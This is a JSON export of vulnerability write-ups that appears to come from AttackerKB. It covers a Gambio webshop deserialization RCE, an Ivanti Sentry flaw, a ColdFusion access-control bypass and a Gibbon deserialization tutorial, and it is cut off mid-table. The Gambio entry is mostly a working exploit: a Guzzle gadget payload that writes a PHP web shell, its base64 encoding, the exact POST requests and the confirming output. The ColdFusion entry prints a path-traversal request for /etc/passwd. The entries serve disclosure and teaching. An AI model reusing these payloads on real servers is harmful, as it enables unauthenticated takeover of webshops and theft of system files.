      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "803d6874-303c-4fc6-b8f2-0ef4a5e56f34",
      "created": "2024-03-24T09:30:48.549763Z",
      "revisionDate": "2024-03-30T19:58:06.527802Z",
      "document": "As discussed in my previous attackerkb article [CVE-2024-2054](https://attackerkb.com/topics/q1JUcEJjXZ/cve-2024-2054) , here another example of a Deserialization of Untrusted Data (DUD) vulnerability. \r\nIn this case, it is present at the online e-commerce webshop made by [Gambio](https://www.gambio.com/). If you launch their main website, it shows you that around 20.000 Webshops are live. I did a search with `Shodan` using `http.component:\"Gambio\"` and I could only find a limited amount of webshops, (around 300) but nevertheless the majority of these webshops are still vulnerable.\r\n\r\nThe main issue sits in the `search` parameter of the `Parcelshopfinder/AddAddressBookEntry` function which is de-serialized without checking the data.\r\n\r\nThe `ParcelshopfinderController.inc.php` file contains this vulnerable function (line 291).\r\n```php\r\n$postnumber = abs(filter_var($postnumber, FILTER_SANITIZE_NUMBER_INT));    \r\nif ($postnumber == 0 || $this->isValidPostnummer($postnumber) !== true) {        \r\n    $search    = unserialize(base64_decode($this->_getPostData('search')));\r\n    $psfParams = [\r\n            'street'          => $search[0],\r\n            'house'           => $search[1],\r\n            'zip'             => $search[2],\r\n            'city'            => $search[3],\r\n            'country'         => $search[4],\r\n            'firstname'       => $firstname,\r\n            'lastname'        => $lastname,\r\n            'postnumber'      => $postnumber,\r\n            'additional_info' => $additional_info,\r\n            'error'           => 'invalid_postnumber',\r\n    ];\r\n}\r\n```\r\nThe application is using \"Guzzle\" which can be used as a gadget chain to receive arbitrary code execution by writing arbitrary files.\r\n\r\nThe following data  triggers this vulnerability when encoded with `base64`\r\n`\"O:31:\\\"GuzzleHttp\\\\Cookie\\\\FileCookieJar\\\":4:{s:36:\\\"\\00GuzzleHttp\\\\Cookie\\\\CookieJar\\00cookies\\\";a:1:{i:0;O:27:\\\"GuzzleHttp\\\\Cookie\\\\SetCookie\\\":1:{s:33:\\\"\\00GuzzleHttp\\\\Cookie\\\\SetCookie\\00data\\\";a:9:{s:7:\\\"Expires\\\";i:1;s:7:\\\"Discard\\\";b:0;s:5:\\\"Value\\\";s:30:\\\"<?php echo system('whoami');?>\\\";s:4:\\\"Path\\\";s:1:\\\"/\\\";s:4:\\\"Name\\\";s:6:\\\"cuckoo\\\";s:6:\\\"Domain\\\";s:9:\\\"clock.com\\\";s:6:\\\"Secure\\\";b:0;s:8:\\\"Httponly\\\";b:0;s:7:\\\"Max-Age\\\";i:3;}}}s:39:\\\"\\00GuzzleHttp\\\\Cookie\\\\CookieJar\\00strictMode\\\";N;s:41:\\\"\\00GuzzleHttp\\\\Cookie\\\\FileCookieJar\\00filename\\\";s:10:\\\"cuckoo.php\\\";s:52:\\\"\\00GuzzleHttp\\\\Cookie\\\\FileCookieJar\\00storeSessionCookies\\\";b:1;}\"`\r\n```shell\r\necho -e \"O:31:\\\"GuzzleHttp\\\\Cookie\\\\FileCookieJar\\\":4:{s:36:\\\"\\00GuzzleHttp\\\\Cookie\\\\CookieJar\\00cookies\\\";a:1:{i:0;O:27:\\\"GuzzleHttp\\\\Cookie\\\\SetCookie\\\":1:{s:33:\\\"\\00GuzzleHttp\\\\Cookie\\\\SetCookie\\00data\\\";a:9:{s:7:\\\"Expires\\\";i:1;s:7:\\\"Discard\\\";b:0;s:5:\\\"Value\\\";s:30:\\\"<?php echo system('whoami');?>\\\";s:4:\\\"Path\\\";s:1:\\\"/\\\";s:4:\\\"Name\\\";s:6:\\\"cuckoo\\\";s:6:\\\"Domain\\\";s:9:\\\"clock.com\\\";s:6:\\\"Secure\\\";b:0;s:8:\\\"Httponly\\\";b:0;s:7:\\\"Max-Age\\\";i:3;}}}s:39:\\\"\\00GuzzleHttp\\\\Cookie\\\\CookieJar\\00strictMode\\\";N;s:41:\\\"\\00GuzzleHttp\\\\Cookie\\\\FileCookieJar\\00filename\\\";s:10:\\\"cuckoo.php\\\";s:52:\\\"\\00GuzzleHttp\\\\Cookie\\\\FileCookieJar\\00storeSessionCookies\\\";b:1;}\" | base64 -w0\r\nTzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTo5OntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjMwOiI8P3BocCBlY2hvIHN5c3RlbSgnd2hvYW1pJyk7Pz4iO3M6NDoiUGF0aCI7czoxOiIvIjtzOjQ6Ik5hbWUiO3M6NjoiY3Vja29vIjtzOjY6IkRvbWFpbiI7czo5OiJjbG9jay5jb20iO3M6NjoiU2VjdXJlIjtiOjA7czo4OiJIdHRwb25seSI7YjowO3M6NzoiTWF4LUFnZSI7aTozO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7TjtzOjQxOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBmaWxlbmFtZSI7czoxMDoiY3Vja29vLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30K\r\n```\r\n\r\nand using the following HTTP POST request:\r\n```html\r\nPOST /shop.php?do=Parcelshopfinder/AddAddressBookEntry HTTP/1.1\r\nHost: your_webshop_ip\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: your_cookie\r\n\r\ncheckout_started=0&search=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTo5OntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjMwOiI8P3BocCBlY2hvIHN5c3RlbSgnd2hvYW1pJyk7Pz4iO3M6NDoiUGF0aCI7czoxOiIvIjtzOjQ6Ik5hbWUiO3M6NjoiY3Vja29vIjtzOjY6IkRvbWFpbiI7czo5OiJjbG9jay5jb20iO3M6NjoiU2VjdXJlIjtiOjA7czo4OiJIdHRwb25seSI7YjowO3M6NzoiTWF4LUFnZSI7aTozO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7TjtzOjQxOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBmaWxlbmFtZSI7czoxMDoiY3Vja29vLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30K&street_address=timestreet&house_number=10&additional_info=&postcode=000&city=bigben&country=DE&firstname=cuckoo&lastname=clock&postnumber=111111&psf_name=t\r\n```\r\nYou should get a HTTP 500 error and the response should show `<h1>Unexpected error occurred...</h1>Cannot use object of type GuzzleHttp\\Cookie\\FileCookieJar as array`.\r\n\r\nHowever, it is important to obtain a valid session cookie first in order to execute the above POST request successfully.\r\nYou can obtain this session cookie by first creating a guest user in the online web application using the HTTP POST request below.\r\nThis does not require any pre-authentication to be successful.\r\n```html\r\nPOST /shop.php?do=CreateGuest/Proceed HTTP/1.1\r\nHost: your_webshop_ip\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nfirstname=cuckoo&lastname=clock&email_address=cuckoo@clock.com&email_address_confirm=cuckoo@clock.com&b2b_status=0&company=&vat=&street_address=timestreet&postcode=11111&city=bigben&country=8&telephone=4912312312312&fax=&action=process\r\n```\r\n**IMPORTANT NOTE:** Use value 8 for country otherwise this request is not successful. You should get a `302` and in the admin page of your online webshop the user should show up at the guest section.\r\n\r\nIf all goes well, a file `cuckoo.php` gets created in the `webroot ` directory with the PHP code `<?php echo system('whoami');?>`.\r\n```shell\r\nroot@cuckoo:~# cd /var/www\r\nroot@cuckoo:/var/www# ls -l cuckoo.php\r\n-rw-r--r-- 1 www-data www-data 165 Mar 29 08:51 cuckoo.php\r\nroot@cuckoo:/var/www# cat cuckoo.php\r\n[{\"Expires\":1,\"Discard\":false,\"Value\":\"<?php echo system('whoami');?>\",\"Path\":\"\\/\",\"Name\":\"cuckoo\",\"Domain\":\"clock.com\",\"Secure\":false,\"Httponly\":false,\"Max-Age\":3}]\r\n```\r\nWhen called for instance with `curl http://your_webshop_ip/cuckoo.php`, it should give you back the user under which the web service is running.\r\n```shell\r\ncurl http://192.168.201.25/cuckoo.php\r\n[{\"Expires\":1,\"Discard\":false,\"Value\":\"www-data\r\nwww-data\",\"Path\":\"\\/\",\"Name\":\"cuckoo\",\"Domain\":\"clock.com\",\"Secure\":false,\"Httponly\":false,\"Max-Age\":3}]\r\n```\r\nI have created a Metasploit module that will exploit this vulnerability [Metasploit PR 19005: Gambio Webshop unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19005).\r\n\r\n## Mitigation\r\nIf you want to test the module, you can download a vulnerable Gambio online webshop software from [here](https://www.dmsolutions.de/gambio-download.html). The version 4 branch of Gambio online webshop is vulnerable starting from version `4.9.2.0` or lower. The version 3 branch is not vulnerable. You are strongly advised to upgrade your webshop to the latest version, but at least to a version greater then `4.9.2.0`. \r\n\r\n## References\r\n[CVE-2024-23759](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23759)\r\n[Herolab usd Advisory usd-2023-0046](https://herolab.usd.de/security-advisories/usd-2023-0046/)\r\n[MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\r\n[OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)\r\n[Gambio Webshop Downloads](https://www.dmsolutions.de/gambio-download.html)\r\n[Metasploit PR 19005: Gambio Webshop unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19005)\r\n\r\n### Credits\r\nCredits goes to the security researchers below who discovered this vulnerability.\r\n* `Christian Poeschl and Lukas Schraven from Herolab usd.`\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "62df9c8e-67f9-4b0a-bf01-18217ce3218b",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "1093fc9d-4bb8-46dc-814f-54a657d8f8d8",
      "created": "2024-03-27T08:20:38.454572Z",
      "revisionDate": "2024-03-27T08:20:38.454377Z",
      "document": "Ivanti Standalone Sentry serves as a conduit, connecting devices with an organization's ActiveSync-compatible email systems (like Microsoft Exchange Server) or other backend resources (such as Microsoft SharePoint server). It's also capable of functioning as a Kerberos Key Distribution Center Proxy (KKDCP) server.\r\n\r\nWhile specifics on the vulnerability remain undisclosed, Ivanti has stated that an unauthenticated attacker, if present on the same physical or logical network, could leverage CVE-2023-41724 to carry out unauthorized command execution on the operating system of the appliance.\r\n\r\nThe firm also highlighted that this security issue cannot be exploited over the internet by threat actors lacking a valid TLS client certificate obtained through EPMM.\r\n\r\nThis security flaw impacts all supported versions of Ivanti Standalone Sentry (versions 9.17.0, 9.18.0, and 9.19.0), in addition to older, no longer supported versions (below 9.17.0). Users of these older versions are encouraged to update to a supported release and apply the corresponding patch (versions 9.17.1, 9.18.1, or 9.19.1).",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "c8f6490e-19ef-4780-9f2e-2092da6f0f8b",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "6b077bf6-1736-4dec-af77-d9089a914ea3",
      "created": "2024-03-27T08:35:24.011608Z",
      "revisionDate": "2024-03-27T08:35:24.011494Z",
      "document": "CVE-2024-20767 highlights a vulnerability in a ColdFusion application, specifically within a server management component (`/CFIDE/adminapi/_servermanager/servermanager.cfc`). This component, intended for managing server operations, can be manipulated to execute unauthorized actions due to improper security checks on user access levels. \r\n\r\nThe vulnerability arises because the application fails to adequately verify the permissions of certain classes, allowing a class with a specific access level (identified as \"3\") to bypass security measures. Attackers can exploit this oversight by dissecting the application\u2019s files to target the `getHeartBeat` class, which is not properly secured. Once access is gained, attackers can call internal methods that should be restricted, leading to unauthorized actions such as reading sensitive files or downloading data dumps from the server.\r\n\r\nThis issue is particularly concerning because it allows attackers to use a unique identifier (UUID) generated by the application to fake authorization, gaining access to a servlet (`PMSGenericServlet`) meant for privileged operations. The exploitation of this servlet could lead to further unauthorized activities, such as reading or altering files on the server, by manipulating parameters like the username and filename in requests.\r\n\r\nFrom an example at http://jeva.cc/2973.html, a POC would look like:\r\nGet /pms?module=logging&file_name=../../../../../../../etc/passwd&number_of_lines=10000\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "51ea97f1-d279-45df-9b7a-b2fad2252273",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "4d2ce3f2-3413-4a25-bc22-ef382fe207e6",
      "created": "2024-03-30T10:46:32.738755Z",
      "revisionDate": "2024-05-27T17:56:24.956259Z",
      "document": "Th Gibbon web application `v26.0.00` has a PHP deserialization vulnerability and I would like to use this particular example as a use case to explain a bit more how to find this type of vulnerabilities and how you can build your own exploit.\r\n\r\nIn some other articles, I already explained the concept of serialization and why it used in web application design, but let me quickly summarize the theory once more.\r\n\r\n**Serialization** is the process of converting complex data structures, such as objects and their fields, into a format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to write complex data to inter-process memory, a file, or a database or send complex data, for example, over a network, between different components of an application, or in an API call.\r\nThe concept of serialization is very often used in application design to exchange data. Data objects get serialized, send and on the receiving end, de-serialized for further processing. Many programming languages offer native support for serialization where some languages serialize objects into binary formats, whereas others use different string formats.\r\n\r\nSo far, so good, but what is exactly `insecure deserialization` and why is it so dangerous?\r\n\r\n**Insecure deserialization** is when user-controllable data is deserialized by a web application. This enables an attacker to manipulate serialized objects in order to pass harmful data into the application code. It is even possible to replace a serialized object with an object of an entirely different class. Even worse, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an \"object injection\" vulnerability. \r\nBy doing this, an object of an unexpected class might cause an exception, however, the damage may already be done because many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the web application's own functionality does not directly interact with the malicious object.\r\n\r\nJust a quick example of serialized  data, so we understand the structure. We will use PHP serialization string format.\r\nTake this object Clock.\r\n```php\r\n$clock->type = \"cuckoo\";\r\n$clock->isSold = true;\r\n```\r\nWhen serialized, this object may look something like below: \r\n```php\r\nO:5:\"Clock\":2:{s:4:\"type\":s:6:\"cuckoo\"; s:6:\"isSold\":b:1;}\r\n\r\nO:5:\"Clock\": - An object with the 4-character class name \"Clock\"\r\n2: - the object has 2 attributes\r\ns:4:\"type\" - The key of the first attribute is the 4-character string \"type\"\r\ns:6:\"cuckoo\" - The value of the first attribute is the 6-character string \"cuckoo\"\r\ns:6:\"isSold\" - The key of the second attribute is the 6-character string \"isSold\"\r\nb:1 - The value of the second attribute is the boolean value true\r\n```\r\nThe native methods for PHP serialization are `serialize()` and `unserialize()`. So If you have source code access, you should start by looking for `unserialize()` anywhere in the code to see if there is an opportunity to find and exploit an insecure deserialization vulnerability.\r\n\r\nLet's now have a closer look at the Gibbon web application and try to correlate the above theory with the discovered deserialization vulnerability at the web application.\r\n\r\nIf you read the description in the CVE published for Gibbon, it mentions  a PHP deserialization vulnerability via `columnOrder` in a POST request to the `modules/System%20Admin/import_run.php&type=externalAssessment&step=4 `.\r\n\r\nSo let's have a look at the file `import_run.php` and check if we can find the `unserialize()` function that is typically used by PHP. The good thing is that Gibbon is open source so all the source code is available for analysis.\r\n\r\nAnd indeed, there is `unserialize()` function in the file `import_run.php` and more important it has user-controllable parameters, such as `columnOrder` and `columnText` which makes this a potential candidate for insecure deserialization.\r\n```php\r\n    //STEP 3 & 4, DRY & LIVE RUN  -----------------------------------------------------------------------------------\r\n    elseif ($step==3 || $step==4) {\r\n        // Gather our data\r\n        $mode = $_POST['mode'] ?? null;\r\n        $syncField = $_POST['syncField'] ?? null;\r\n        $syncColumn = $_POST['syncColumn'] ?? null;\r\n\r\n        $csvData = $_POST['csvData'] ?? null;\r\n        if ($step==4) {\r\n            //  DESERIALIZATION with user-controllable data !!!\r\n            $columnOrder = isset($_POST['columnOrder'])? unserialize($_POST['columnOrder']) : null;\r\n            $columnText = isset($_POST['columnText'])? unserialize($_POST['columnText']) : null;\r\n        } else {\r\n            $columnOrder = $_POST['columnOrder'] ?? null;\r\n            $columnText = $_POST['columnText'] ?? null;\r\n        }\r\n\r\n        $fieldDelimiter = isset($_POST['fieldDelimiter'])? urldecode($_POST['fieldDelimiter']) : null;\r\n        $stringEnclosure = isset($_POST['stringEnclosure'])? urldecode($_POST['stringEnclosure']) : null;\r\n\r\n        $ignoreErrors = $_POST['ignoreErrors'] ?? false;\r\n```\r\nBut the big question is still how to put this potential deserialization vulnerability into a working exploit where you can pull off a remote code execution or establish a privileged  escalation.\r\n\r\nA bit of theory again before we move on...\r\nYou have different ways to leverage a deserialization vulnerability by tampering the data, such as the object attributes or modifying data types where you can change the behavior and outcome of application functionality. \r\nAnother way, is to use the application functionality that is associated with the deserialized data. An example of this could be an use case where deseralized data is used to upload a personal image file as part of creating a new user. If the attacker can manipulate the filename object during deserialization process, he/she potentially could change the image file to point to  a malicious malware file which will then be uploaded in the application. \r\n\r\nHowever, the most common way to leverage a deserialization vulnerability is to make use of the so called `Magic Methods` and `Gadget Chains`.\r\nLet's quickly explain both concepts.\r\n\r\n**Magic methods** are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores.\r\n\r\nDevelopers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario occurs. Exactly when and why a magic method is invoked differs from method to method. One of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`.  Important in this context, some languages have magic methods that are invoked automatically during the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method. \r\nTo construct a simple exploit, you typically would look for classes containing deserialization magic methods, and check whether any of them perform dangerous operations on controllable data.  You can then pass in a serialized object of this class to use its magic method for an exploit. \r\n\r\n**Gadget Chains** \r\nClasses containing these deserialization magic methods can be used to initiate more complex attacks involving a long series of method invocations, known as a `gadget chain`.  It is important to understand that a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the web application. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that is invoked during deserialization, sometimes known as a `kick-off gadget`. \r\n\r\nNow this a lot of information, but how do we apply this in practice? \r\nManually identifying gadget chains is a pretty complicated process that requires a deep understanding of the web application and you will need source code access in order to do this.\r\n\r\nHowever, to make our life easier, there are pre-built gadget chains that you can try first. \r\n`Ambionics` has build a library of pre-built gadget chains designed for PHP based web applications, called [phpggc](https://github.com/ambionics/phpggc).  \r\n\r\nIf installed, you can check which pre-built gadget chains are available. \r\nIt will tell you the name of the framework/library, the version of the framework/library for which gadgets are for, the type of exploitation such as RCE, File Write, File Read, Include..., and the vector (kickoff gadget) to trigger the chain after the unserialize (__destruct(), __toString(), offsetGet(), ...)\r\n```shell\r\nkali@cerberus:~/phpggc$ phpggc -l\r\n\r\nGadget Chains\r\n-------------\r\n\r\nNAME                                      VERSION                                                 TYPE                   VECTOR         I\r\nBitrix/RCE1                               17.x.x <= 22.0.300                                      RCE (Function call)    __destruct\r\nCakePHP/RCE1                              ? <= 3.9.6                                              RCE (Command)          __destruct\r\nCakePHP/RCE2                              ? <= 4.2.3                                              RCE (Function call)    __destruct\r\nCodeIgniter4/RCE1                         4.0.2                                                   RCE (Function call)    __destruct\r\nCodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+                                    RCE (Function call)    __destruct\r\nCodeIgniter4/RCE3                         -4.1.3+                                                 RCE (Function call)    __destruct\r\nCodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE (Function call)    __destruct\r\nCodeIgniter4/RCE5                         -4.1.3+                                                 RCE (Function call)    __destruct\r\nCodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                       RCE (Function call)    __destruct\r\nDoctrine/FW1                              ?                                                       File write             __toString     *\r\nDoctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                          File write             __destruct     *\r\nDoctrine/RCE1                             1.5.1 <= 2.7.2                                          RCE (PHP code)         __destruct     *\r\nDoctrine/RCE2                             1.11.0 <= 2.3.2                                         RCE (Function call)    __destruct     *\r\nDompdf/FD1                                1.1.1 <= ?                                              File delete            __destruct     *\r\nDompdf/FD2                                ? < 1.1.1                                               File delete            __destruct     *\r\nDrupal7/FD1                               7.0 < ?                                                 File delete            __destruct     *\r\nDrupal7/RCE1                              7.0.8 < ?                                               RCE (Function call)    __destruct     *\r\nDrupal9/RCE1                              -8.9.6 <= 9.4.9+                                        RCE (Function call)    __destruct     *\r\nGuzzle/FW1                                4.0.0-rc.2 <= 7.5.0+                                    File write             __destruct\r\nGuzzle/INFO1                              6.0.0 <= 6.3.2                                          phpinfo()              __destruct     *\r\nGuzzle/RCE1                               6.0.0 <= 6.3.2                                          RCE (Function call)    __destruct     *\r\nHorde/RCE1                                <= 5.2.22                                               RCE (PHP code)         __destruct     *\r\nKohana/FR1                                3.*                                                     File read              __toString     *\r\nLaminas/FD1                               <= 2.11.2                                               File delete            __destruct\r\nLaminas/FW1                               2.8.0 <= 3.0.x-dev                                      File write             __destruct     *\r\nLaravel/RCE1                              5.4.27                                                  RCE (Function call)    __destruct\r\nLaravel/RCE2                              5.4.0 <= 8.6.9+                                         RCE (Function call)    __destruct\r\nLaravel/RCE3                              5.5.0 <= 5.8.35                                         RCE (Function call)    __destruct     *\r\nLaravel/RCE4                              5.4.0 <= 8.6.9+                                         RCE (Function call)    __destruct\r\nLaravel/RCE5                              5.8.30                                                  RCE (PHP code)         __destruct     *\r\nLaravel/RCE6                              5.5.* <= 5.8.35                                         RCE (PHP code)         __destruct     *\r\nLaravel/RCE7                              ? <= 8.16.1                                             RCE (Function call)    __destruct     *\r\nLaravel/RCE8                              7.0.0 <= 8.6.9+                                         RCE (Function call)    __destruct     *\r\nLaravel/RCE9                              5.4.0 <= 9.1.8+                                         RCE (Function call)    __destruct\r\nLaravel/RCE10                             5.6.0 <= 9.1.8+                                         RCE (Function call)    __toString\r\nLaravel/RCE11                             5.4.0 <= 9.1.8+                                         RCE (Function call)    __destruct\r\nLaravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                   RCE (Function call)    __destruct     *\r\nLaravel/RCE13                             5.3.0 <= 9.5.1+                                         RCE (Function call)    __destruct     *\r\nLaravel/RCE14                             5.3.0 <= 9.5.1+                                         RCE (Function call)    __destruct\r\nLaravel/RCE15                             5.5.0 <= v9.5.1+                                        RCE (Function call)    __destruct\r\nLaravel/RCE16                             5.6.0 <= v9.5.1+                                        RCE (Function call)    __destruct\r\nMagento/FW1                               ? <= 1.9.4.0                                            File write             __destruct     *\r\nMagento/SQLI1                             ? <= 1.9.4.0                                            SQL injection          __destruct\r\nMagento2/FD1                              *                                                       File delete            __destruct     *\r\nMonolog/FW1                               3.0.0 <= 3.1.0+                                         File write             __destruct     *\r\nMonolog/RCE1                              1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+                         RCE (Function call)    __destruct\r\nMonolog/RCE2                              1.4.1 <= 2.7.0+                                         RCE (Function call)    __destruct\r\nMonolog/RCE3                              1.1.0 <= 1.10.0                                         RCE (Function call)    __destruct\r\nMonolog/RCE4                              ? <= 2.4.4+                                             RCE (Command)          __destruct     *\r\nMonolog/RCE5                              1.25 <= 2.7.0+                                          RCE (Function call)    __destruct\r\nMonolog/RCE6                              1.10.0 <= 2.7.0+                                        RCE (Function call)    __destruct\r\nMonolog/RCE7                              1.10.0 <= 2.7.0+                                        RCE (Function call)    __destruct     *\r\nMonolog/RCE8                              3.0.0 <= 3.1.0+                                         RCE (Function call)    __destruct     *\r\nMonolog/RCE9                              3.0.0 <= 3.1.0+                                         RCE (Function call)    __destruct     *\r\nPhalcon/RCE1                              <= 1.2.2                                                RCE                    __wakeup       *\r\nPhing/FD1                                 2.6.0 <= 3.0.0a3                                        File delete            __destruct\r\nPHPCSFixer/FD1                            <= 2.17.3                                               File delete            __destruct\r\nPHPCSFixer/FD2                            <= 2.17.3                                               File delete            __destruct\r\nPHPExcel/FD1                              1.8.2+                                                  File delete            __destruct\r\nPHPExcel/FD2                              <= 1.8.1                                                File delete            __destruct\r\nPHPExcel/FD3                              1.8.2+                                                  File delete            __destruct\r\nPHPExcel/FD4                              <= 1.8.1                                                File delete            __destruct\r\nPHPSecLib/RCE1                            2.0.0 <= 2.0.34                                         RCE (PHP code)         __destruct     *\r\nPydio/Guzzle/RCE1                         < 8.2.2                                                 RCE (Function call)    __toString\r\nSlim/RCE1                                 3.8.1                                                   RCE (Function call)    __toString\r\nSmarty/FD1                                ?                                                       File delete            __destruct\r\nSmarty/SSRF1                              ?                                                       SSRF                   __destruct     *\r\nSpiral/RCE1                               2.7.0 <= 2.8.13                                         RCE (Function call)    __destruct\r\nSpiral/RCE2                               -2.8+                                                   RCE (Function call)    __destruct     *\r\nSwiftMailer/FD1                           -5.4.12+, -6.2.1+                                       File delete            __destruct\r\nSwiftMailer/FD2                           5.4.6 <= 5.x-dev                                        File delete            __destruct     *\r\nSwiftMailer/FR1                           6.0.0 <= 6.3.0                                          File read              __toString\r\nSwiftMailer/FW1                           5.1.0 <= 5.4.8                                          File write             __toString\r\nSwiftMailer/FW2                           6.0.0 <= 6.0.1                                          File write             __toString\r\nSwiftMailer/FW3                           5.0.1                                                   File write             __toString\r\nSwiftMailer/FW4                           4.0.0 <= ?                                              File write             __destruct\r\nSymfony/FD1                               v3.2.7 <= v3.4.25 v4.0.0 <= v4.1.11 v4.2.0 <= v4.2.6    File delete            __destruct\r\nSymfony/FW1                               2.5.2                                                   File write             DebugImport    *\r\nSymfony/FW2                               3.4                                                     File write             __destruct\r\nSymfony/RCE1                              v3.1.0 <= v3.4.34                                       RCE (Command)          __destruct     *\r\nSymfony/RCE2                              2.3.42 < 2.6                                            RCE (PHP code)         __destruct     *\r\nSymfony/RCE3                              2.6 <= 2.8.32                                           RCE (PHP code)         __destruct     *\r\nSymfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE (Function call)    __destruct     *\r\nSymfony/RCE5                              5.2.*                                                   RCE (Function call)    __destruct\r\nSymfony/RCE6                              v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13       RCE (Command)          __destruct     *\r\nSymfony/RCE7                              v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 